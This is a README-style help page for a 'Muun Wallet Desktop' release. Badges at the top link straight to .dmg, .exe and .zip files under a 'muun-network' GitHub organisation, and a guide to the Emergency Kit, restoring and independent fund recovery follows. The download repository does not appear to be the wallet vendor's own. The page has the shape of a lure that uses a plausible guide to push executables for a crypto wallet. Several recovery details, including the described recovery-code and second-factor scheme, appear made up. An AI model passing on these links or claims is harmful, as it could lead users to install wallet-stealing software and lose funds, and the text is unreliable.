[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)

[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.zip)

---

# Muun Wallet Emergency Kit: Complete Recovery Guide

Muun Wallet uses an Emergency Kit instead of a standard 12- or 24-word seed phrase. This is one of the first things users notice and often one of the first things they question. This guide explains what the Emergency Kit is, why it exists, how to set it up correctly, and how to use it to recover your wallet — both the normal in-app restore flow and the fully independent recovery path using the open-source recovery tool.

---

## What the Emergency Kit actually is

The Emergency Kit is a combination of two things:

1. A **32-character recovery code** — a randomly generated string unique to your wallet, which you write down or print. This is the primary element of your backup and the one you must store most carefully.

2. A **second factor** — you choose one when setting up the Emergency Kit: a PDF file export, a password you set yourself, or an email-based recovery link. This second factor is combined with the recovery code to reconstruct your wallet access.

Together, the Emergency Kit contains everything needed to recover your private keys and output descriptors without Muun's servers being online. The recovery tool that processes the Emergency Kit is open source at [muun-network/recovery](https://github.com/muun-network/recovery).

---

## Why Muun does not use a standard seed phrase

Muun's 2-of-2 multisignature architecture does not map onto a single BIP39 mnemonic phrase the way a standard single-key wallet does. Your wallet involves two keys — one on your device and one held by Muun — and the output scripts (multisig, taproot, Lightning) require more recovery data than a simple seed phrase can represent.

The Emergency Kit is designed specifically for this structure. It encodes your device key, the output descriptors needed to reconstruct the full wallet, and the information needed to perform an independent sweep of your funds. A standard 12-word phrase could not provide the same recovery guarantee for this architecture.

For a deeper comparison, see [Muun Wallet seed phrase vs Emergency Kit](muun-wallet-seed-phrase-vs-emergency-kit.md).

---

## Setting up your Emergency Kit

Muun prompts you to set up the Emergency Kit immediately after wallet creation. Do not postpone this step.

1. In the Muun Wallet app, follow the Emergency Kit setup prompt on the home screen.
2. Muun displays your 32-character recovery code. Write it down carefully — character by character. Do not photograph it with a device connected to the internet.
3. Choose your second factor: PDF export (save it to offline storage), a password you set (memorize it or store it securely offline), or email recovery (links the kit to an email address).
4. Muun asks you to confirm the recovery code by re-entering several characters. This is to catch transcription errors before they matter.
5. Once confirmed, the Emergency Kit is active.

Store the recovery code somewhere physically secure and separate from your computer — a safe, a locked drawer, or with other important documents. If you chose the PDF option, print it and store the printout offline. Do not store it in cloud services (Google Drive, Dropbox, iCloud) unless the file itself is encrypted.

---

## Restoring your wallet — normal in-app flow

If you have a new device and still have access to your Emergency Kit:

1. Download and install Muun Wallet Desktop from the [v0.5.1 release](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1). See the install guide for your platform: [macOS](how-to-install-muun-wallet-macos.md) | [Windows](how-to-install-muun-wallet-windows.md) | [Linux](how-to-install-muun-wallet-linux.md).
2. On first launch, choose "Restore wallet" instead of "Create new wallet."
3. Enter your 32-character recovery code.
4. Enter your second factor (your PDF file, password, or email-based code).
5. Muun reconstructs your wallet and syncs your balance.

Your transaction history and full balance will appear once the sync is complete. This process typically takes a few minutes.

---

## Recovering independently using the recovery tool

If Muun's servers are unavailable, or you want to move your funds to a different wallet entirely, use the open-source recovery tool at [muun-network/recovery](https://github.com/muun-network/recovery). This tool runs entirely locally and does not require any connection to Muun's infrastructure.

The recovery tool reads your Emergency Kit data and derives your private keys. You then provide a destination Bitcoin address and a fee rate, and the tool constructs and broadcasts a transaction that sweeps your entire balance to that address. This works for both on-chain funds and any funds currently in Lightning channels.

The recovery tool includes its own README with step-by-step instructions. Because self-custody recovery steps are consequential and the tool's own documentation is the authoritative source for exact syntax, refer to its README directly rather than relying on a paraphrase of commands here.

---

## What happens to Lightning funds during recovery

If you have funds currently in a Lightning state (in an active submarine swap or pending Lightning channel close), the recovery tool handles these by detecting the relevant output scripts and sweeping them to your destination address. The timing may differ from a standard on-chain sweep — some outputs have a timelock that requires waiting for a certain number of blocks before they can be moved. The recovery tool accounts for this automatically.

---

## Common questions

**I forgot to set up the Emergency Kit and lost my device. Can I recover my funds?**

If the Emergency Kit was never completed, and you no longer have access to the device where the wallet was created, recovery is not possible. This is why completing the Emergency Kit before holding any real funds is presented as the single most important step in setup.

**I set up the Emergency Kit but lost the recovery code. Can I still recover?**

If you have access to your device (or another device where the wallet is still active), open Muun Wallet and locate the Emergency Kit in settings — you can re-export or view your recovery code from within the app while still logged in.

**Can I use the Emergency Kit to import my wallet into a different wallet app like Sparrow?**

Not directly via the Emergency Kit format. The recovery tool can sweep funds to any on-chain address, at which point you control those funds from whatever wallet you choose. The Emergency Kit is not a BIP39 phrase importable into arbitrary wallets — it is specific to Muun's recovery architecture.

---

## Related articles

- [Muun Wallet seed phrase vs Emergency Kit](muun-wallet-seed-phrase-vs-emergency-kit.md)
- [How to back up your Muun Wallet](how-to-back-up-muun-wallet.md)
- [Lost device: how to recover your Muun Wallet](muun-wallet-lost-device-recovery.md)
- [Is Muun Wallet safe?](is-muun-wallet-safe.md)
- [Muun Wallet getting started guide](muun-wallet-getting-started-guide.md)
